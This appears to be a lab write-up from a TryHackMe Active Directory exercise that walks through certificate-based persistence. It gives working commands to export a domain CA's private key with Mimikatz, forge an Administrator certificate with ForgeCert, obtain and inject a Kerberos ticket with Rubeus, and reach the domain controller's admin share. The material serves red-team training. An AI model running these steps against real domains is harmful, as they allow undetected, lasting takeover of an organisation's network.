# Persistence through certificates

**A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them.**

In [Exploiting certificates](../exploit/certificates.md), certificates were leveraged to become Domain Admins. 
Certificates can also be used for persistence.

* This attack revolves around taking the private key of the Certificate Authority (CA) of the domain.
* Armed with the private key, the attacker can now effectively "approve" their own Certificate Signing Requests (CSRs) and generate certificates to any user they please.
* In Kerberos authentication, a user can authenticate by providing their public key.

SSH to the domain controller using the [given domain administrator credential](setup.md). Since the Active Directory 
Certificate Services (AD CS) services is running on the domain controller, the attack is executed on this host.

    ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc

## Extract the CA's Private Key

    powershell -ep bypass

Start Mimikatz:

    C:\Tools\mimikatz_trunk\x64\mimikatz.exe

Enumerate certificates

    mimikatz # crypto::certificates /systemstore:local_machine

Elevate privileges:

    mimikatz # privilege::debug

Allow certificate export without private key:

    mimikatz # crypto::capi
    mimikatz # crypto::cng

Export the certificates with private keys:

    mimikatz # crypto::certificates /systemstore:local_machine /export

Exit:

    mimikatz # exit

## Create a certificate for the domain administrator account

List the certificate files. `local_machine_My_1_za-THMDC-CA.pfx` is the CA's certificate with the private key:

    Get-ChildItem .\*.pfx

    C:\Tools\ForgeCert\ForgeCert\ForgeCert.exe --CaCertPath .\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject 'CN=Pwned' --SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\domain-admin.pfx --NewCertPassword pwned123

Create the TGT using Rubeus and save it locally:

    C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\domain-admin.pfx' /password:'pwned123' /outfile:domain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101

Use Mimikatz to inject the ticket into the session:

    C:\Tools\mimikatz_trunk\x64\mimikatz.exe
    
    mimikatz # kerberos::ptt domain-admin.kirbi

Exit:

    mimikatz # exit

Browse:

    dir \\thmdc.za.tryhackme.loc\C$\Users


